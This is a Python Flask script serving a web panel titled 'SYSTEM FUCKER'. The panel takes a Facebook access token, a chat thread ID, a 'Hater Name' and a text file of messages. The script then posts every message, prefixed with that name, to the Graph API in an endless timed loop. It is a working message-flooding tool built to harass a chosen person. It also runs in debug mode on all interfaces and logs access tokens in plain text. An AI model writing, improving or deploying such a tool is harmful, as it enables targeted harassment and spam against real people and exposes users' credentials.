from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)

    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ANU INSIDE SERVER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow-x: hidden;
    }
    #bg-video {
      position: fixed;
      right: 0;
      bottom: 0;
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
      z-index: -1;
    }
    .container{
      max-width: 500px;
      background-color: rgba(255, 255, 255, 0.85);
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      margin: 20px auto;
      position: relative;
      z-index: 1;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
      color: #fff;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      position: relative;
      z-index: 1;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #fff;
      text-shadow: 1px 1px 5px rgba(0,0,0,0.8);
      position: relative;
      z-index: 1;
    }
  </style>
</head>
<body>
  <!-- Background Video -->
  <video autoplay muted loop playsinline id="bg-video">
    <source src="https://files.catbox.moe/dsqa53.mp4" type="video/mp4">
    Your browser does not support HTML5 video.
  </video>

  <header class="header mt-4">
    <h1 class="mb-3"> SYSTEM FUCKER BY ANU INSIDE >3:)</h1>
    <h1 class="mt-3">SYSTEM FUCKER ]|I{•------» ANU INSIDE</h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; Developed by ANU INSIDE 2025. Reserved.</p>
    <p>🔥 SYSTEM FUCKER PANEL 🔥</p>
  </footer>
</body>
</html>"""

if __name__ == '__main__':
    print("YOUR SERVICE HAS STARTED ✅")
    app.run(host='0.0.0.0', port=5000, debug=True)
